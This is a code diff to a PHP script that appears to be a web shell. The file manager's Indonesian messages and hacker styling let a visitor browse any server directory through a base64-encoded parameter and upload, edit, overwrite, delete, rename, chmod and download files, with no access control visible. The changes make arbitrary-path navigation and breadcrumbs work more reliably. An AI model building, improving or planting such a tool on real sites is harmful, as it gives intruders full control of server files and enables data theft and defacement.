@@ -269,17 +269,24 @@ $current_dir = getcwd();
 
 if (isset($_GET['dir'])) {
     $requested = base64_decode($_GET['dir']);
-    if (is_dir($requested) && file_exists($requested)) {
-        $current_dir = $requested;
-        @chdir($current_dir);
+    // Normalize: convert backslash to forward slash and remove trailing slash
+    $requested = rtrim(str_replace('\\', '/', $requested), '/');
+    
+    // Try to change directory
+    if (@chdir($requested)) {
+        $current_dir = getcwd();
     }
 }
+
+// Normalize current_dir - remove trailing slashes
+$current_dir = rtrim(str_replace('\\', '/', $current_dir), '/');
+if (empty($current_dir)) $current_dir = '/';
 
 // ==================== FILE OPERATIONS ====================
 // Upload
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
     $file = $_FILES['file'];
-    $target = $current_dir . DIRECTORY_SEPARATOR . basename($file['name']);
+    $target = $current_dir . '/' . basename($file['name']);
     if (move_uploaded_file($file['tmp_name'], $target)) {
         $_SESSION['msg'] = '✓ Upload berhasil!';
     }
@@ -289,7 +296,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
 
 // Delete
 if (isset($_GET['delete'])) {
-    $file = $current_dir . DIRECTORY_SEPARATOR . basename(base64_decode($_GET['delete']));
+    $file = $current_dir . '/' . basename(base64_decode($_GET['delete']));
     if (is_file($file)) {
         unlink($file);
         $_SESSION['msg'] = '✓ File dihapus!';
@@ -300,8 +307,8 @@ if (isset($_GET['delete'])) {
 
 // Rename
 if (isset($_POST['rename_submit'])) {
-    $old = $current_dir . DIRECTORY_SEPARATOR . basename($_POST['old_name']);
-    $new = $current_dir . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
+    $old = $current_dir . '/' . basename($_POST['old_name']);
+    $new = $current_dir . '/' . basename($_POST['new_name']);
     if (file_exists($old)) {
         rename($old, $new);
         $_SESSION['msg'] = '✓ Renamed!';
@@ -312,7 +319,7 @@ if (isset($_POST['rename_submit'])) {
 
 // Chmod
 if (isset($_POST['chmod_submit'])) {
-    $file = $current_dir . DIRECTORY_SEPARATOR . basename($_POST['chmod_file']);
+    $file = $current_dir . '/' . basename($_POST['chmod_file']);
     if (file_exists($file)) {
         @chmod($file, octdec($_POST['chmod_value']));
         $_SESSION['msg'] = '✓ Permissions changed!';
@@ -323,7 +330,7 @@ if (isset($_POST['chmod_submit'])) {
 
 // Create Folder
 if (isset($_POST['mkdir'])) {
-    @mkdir($current_dir . DIRECTORY_SEPARATOR . basename($_POST['folder_name']));
+    @mkdir($current_dir . '/' . basename($_POST['folder_name']));
     $_SESSION['msg'] = '✓ Folder dibuat!';
     header('Location: ?dir=' . base64_encode($current_dir));
     exit;
@@ -331,7 +338,7 @@ if (isset($_POST['mkdir'])) {
 
 // Create File
 if (isset($_POST['mkfile'])) {
-    @touch($current_dir . DIRECTORY_SEPARATOR . basename($_POST['file_name']));
+    @touch($current_dir . '/' . basename($_POST['file_name']));
     $_SESSION['msg'] = '✓ File dibuat!';
     header('Location: ?dir=' . base64_encode($current_dir));
     exit;
@@ -339,7 +346,7 @@ if (isset($_POST['mkfile'])) {
 
 // Download
 if (isset($_GET['download'])) {
-    $file = $current_dir . DIRECTORY_SEPARATOR . basename(base64_decode($_GET['download']));
+    $file = $current_dir . '/' . basename(base64_decode($_GET['download']));
     if (is_file($file)) {
         header('Content-Type: application/octet-stream');
         header('Content-Disposition: attachment; filename="' . basename($file) . '"');
@@ -350,7 +357,7 @@ if (isset($_GET['download'])) {
 
 // Edit & Save
 if (isset($_POST['save_code'])) {
-    $file = $current_dir . DIRECTORY_SEPARATOR . basename($_POST['edit_file']);
+    $file = $current_dir . '/' . basename($_POST['edit_file']);
     if (file_exists($file)) {
         file_put_contents($file, $_POST['code_content']);
         $_SESSION['msg'] = '✓ File saved!';
@@ -456,16 +463,28 @@ sort($files);
             border-radius: 4px;
             margin-bottom: 15px;
             border: 1px solid #333;
-            font-size: 11px;
+            font-size: 12px;
             overflow-x: auto;
+            word-break: break-word;
+        }
+        .path-bar strong {
+            color: #00ff88;
+            margin-right: 8px;
         }
         .path-bar a {
             color: #00ff88;
             text-decoration: none;
-            margin: 0 5px;
+            margin: 0 8px;
+            cursor: pointer;
+            display: inline-block;
+            padding: 4px 8px;
+            border-radius: 3px;
+            transition: all 0.2s;
         }
         .path-bar a:hover {
             text-decoration: underline;
+            background: rgba(0, 255, 136, 0.1);
+            text-shadow: 0 0 8px rgba(0, 255, 136, 0.3);
         }
         .toolbar {
             display: flex;
@@ -698,22 +717,35 @@ sort($files);
         <!-- FILE MANAGER -->
         <?php if (!isset($_GET['page']) || $_GET['page'] === ''): ?>
             <div class="path-bar">
-                <strong>Path:</strong>
+                <strong>📂 Path:</strong>
                 <?php
-                $paths = explode(DIRECTORY_SEPARATOR, trim($current_dir, DIRECTORY_SEPARATOR));
-                echo '<a href="?dir=' . base64_encode('/') . '">/</a>';
-                $breadcrumb = '';
-                foreach ($paths as $path) {
-                    if (empty($path)) continue;
-                    $breadcrumb .= $path . DIRECTORY_SEPARATOR;
-                    echo ' <span>›</span> ';
-                    echo '<a href="?dir=' . base64_encode($breadcrumb) . '">' . htmlspecialchars($path) . '</a>';
+                // Simple and reliable breadcrumb generation
+                if ($current_dir === '/') {
+                    echo ' <a href="?dir=' . base64_encode('/') . '">/</a>';
+                } else {
+                    // Root link
+                    echo ' <a href="?dir=' . base64_encode('/') . '">/</a>';
+                    
+                    // Split path and build breadcrumbs
+                    $path_parts = array_filter(explode('/', $current_dir));
+                    $path_so_far = '';
+                    
+                    foreach ($path_parts as $part) {
+                        $path_so_far .= '/' . $part;
+                        echo ' <span style="color: #666;">›</span> ';
+                        echo '<a href="?dir=' . base64_encode($path_so_far) . '">' . htmlspecialchars($part) . '</a>';
+                    }
                 }
                 ?>
             </div>
 
             <div class="toolbar">
-                <a href="?dir=<?php echo base64_encode(dirname($current_dir)); ?>" class="btn">⬆️ Up</a>
+                <?php
+                $parent_dir = dirname($current_dir);
+                if ($parent_dir !== $current_dir) {
+                    echo '<a href="?dir=' . base64_encode($parent_dir) . '" class="btn">⬆️ Up</a>';
+                }
+                ?>
                 <label class="btn" style="cursor: pointer; margin-bottom: 0;">📤 Upload
                     <input type="file" id="file_input" onchange="document.getElementById('upload_form').submit()">
                 </label>
@@ -740,7 +772,7 @@ sort($files);
                     <?php foreach ($files as $file): ?>
                         <?php if ($file === '.' || $file === '..') continue; ?>
                         <?php
-                        $filepath = $current_dir . DIRECTORY_SEPARATOR . $file;
+                        $filepath = $current_dir . '/' . $file;
                         $is_dir = is_dir($filepath);
                         $size = $is_dir ? '-' : format_size(filesize($filepath));
                         $perms = get_perms($filepath);
